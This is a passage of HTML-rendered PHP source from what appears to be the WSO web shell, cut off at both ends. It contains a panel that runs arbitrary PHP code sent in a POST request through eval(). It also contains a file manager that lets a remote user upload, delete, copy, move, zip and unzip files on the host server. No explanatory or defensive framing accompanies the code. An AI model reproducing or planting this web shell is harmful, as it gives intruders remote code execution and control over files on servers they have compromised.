    <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;info&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;PHP info&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;style&amp;gt;.p {color:#000;}&amp;lt;/style&amp;gt;&#39;</span><span class="p">;</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="nb">phpinfo</span><span class="p">();</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!td, th {(.*)}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;.e, .v, .h, .h th {$1}&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;h1&#39;</span><span class="p">,</span><span class="s1">&#39;h2&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
        <span class="o">@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Execution PHP-code&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;form name=pf method=post onsubmit=&quot;if(this.ajax.checked){a(\&#39;Php\&#39;,null,this.code.value);}else{g(\&#39;Php\&#39;,null,this.code.value,\&#39;\&#39;);}return false;&quot;&amp;gt;&amp;lt;textarea name=code class=bigarea id=PhpCode&amp;gt;&#39;</span><span class="o">.</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/textarea&amp;gt;&amp;lt;input type=submit value=Eval style=&quot;margin-top:5px&quot;&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39; &amp;lt;input type=checkbox name=ajax value=1 &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt; send using AJAX&amp;lt;/form&amp;gt;&amp;lt;pre id=PhpOutput style=&quot;&#39;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;display:none;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;margin-top:5px;&quot; class=ml1&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
        <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">());</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">actionFilesMan</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;File manager&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;script&amp;gt;p1_=p2_=p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">case</span> <span class="s1">&#39;uploadFile&#39;</span><span class="o">:</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span>
                    <span class="k">echo</span> <span class="s2">&quot;Can&#39;t upload file!&quot;</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="s1">&#39;mkdir&#39;</span><span class="o">:</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span>
                    <span class="k">echo</span> <span class="s2">&quot;Can&#39;t create new dir&quot;</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="s1">&#39;delete&#39;</span><span class="o">:</span>
                <span class="k">function</span> <span class="nf">deleteDir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$path</span> <span class="o">=</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$path</span><span class="o">:</span><span class="nv">$path</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
                    <span class="nv">$dh</span>  <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
                    <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">.</span><span class="nv">$item</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="p">)</span>
                            <span class="k">continue</span><span class="p">;</span>
                        <span class="nv">$type</span> <span class="o">=</span> <span class="nb">filetype</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s2">&quot;dir&quot;</span><span class="p">)</span>
                            <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                        <span class="k">else</span>
                            <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
                    <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]))</span>
                    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$f</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                        <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span>
                            <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                        <span class="k">else</span>
                            <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="s1">&#39;paste&#39;</span><span class="o">:</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;copy&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">function</span> <span class="nf">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$d</span><span class="p">){</span>
                        <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">)){</span>
                            <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                            <span class="nv">$h</span> <span class="o">=</span> <span class="o">@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                            <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
                                <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span>
                                    <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
                                <span class="p">}</span>
                        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">))</span> <span class="p">{</span>
                            <span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span>
                        <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">],</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;move&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">function</span> <span class="nf">move_paste</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$d</span><span class="p">){</span>
                        <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">)){</span>
                            <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                            <span class="nv">$h</span> <span class="o">=</span> <span class="o">@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                            <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
                                <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span>
                                    <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
                                <span class="p">}</span>
                        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">))</span> <span class="p">{</span>
                            <span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span>
                        <span class="o">@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;zip&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="nb">class_exists</span><span class="p">(</span><span class="s1">&#39;ZipArchive&#39;</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;wso_&#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Ymd_His&quot;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.zip&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;return ZIPARCHIVE::CREATE;&#39;</span><span class="p">)))</span> <span class="p">{</span>
                            <span class="nb">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
                            <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span>
                                    <span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">addFile</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$f</span><span class="p">);</span>
                                <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
                                    <span class="nv">$iterator</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">RecursiveIteratorIterator</span><span class="p">(</span><span class="k">new</span> <span class="nx">RecursiveDirectoryIterator</span><span class="p">(</span><span class="nv">$f</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">));</span>
                                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                                        <span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">addFile</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$key</span><span class="p">),</span> <span class="nv">$key</span><span class="p">);</span>
                                    <span class="p">}</span>
                                <span class="p">}</span>
                            <span class="p">}</span>
                            <span class="nb">chdir</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
                            <span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">close</span><span class="p">();</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;unzip&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="nb">class_exists</span><span class="p">(</span><span class="s1">&#39;ZipArchive&#39;</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">if</span><span class="p">(</span><span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">open</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
                                <span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">extractTo</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
                                <span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">close</span><span class="p">();</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;copy&#39;</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;move&#39;</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;zip&#39;</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;unzip&#39;</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">];</span>
                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
                    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$f</span><span class="p">)</span>
                        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
                <span class="p">}</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$dirContent</span> <span class="o">=</span> <span class="o">@</span><span class="nb">scandir</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">:</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$dirContent</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>   <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t open this folder!&#39;</span><span class="p">;</span><span class="nx">wsoFooter</span><span class="p">();</span> <span class="k">return</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">global</span> <span class="nv">$sort</span><span class="p">;</span>
    <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;!s_([A-z]+)_(\d{1})!&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$match</span><span class="p">))</span>
            <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;script&amp;gt; </span>
<span class="s2">   function sa() {</span>
<span class="s2">       for(i=0;i&amp;lt;document.files.elements.length;i++)</span>
<span class="s2">           if(document.files.elements[i].type == &#39;checkbox&#39;)</span>
<span class="s2">               document.files.elements[i].checked = document.files.elements[0].checked;</span>
<span class="s2">   }</span>
<span class="s2">&amp;lt;/script&amp;gt; </span>
<span class="s2">&amp;lt;table width=&#39;100%&#39; class=&#39;main&#39; cellspacing=&#39;0&#39; cellpadding=&#39;2&#39;&amp;gt; </span>
<span class="s2">&amp;lt;form name=files method=post&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th width=&#39;13px&#39;&amp;gt;&amp;lt;input type=checkbox onclick=&#39;sa()&#39; class=chkbx&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_name_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;Name&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_size_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;Size&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_modify_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span 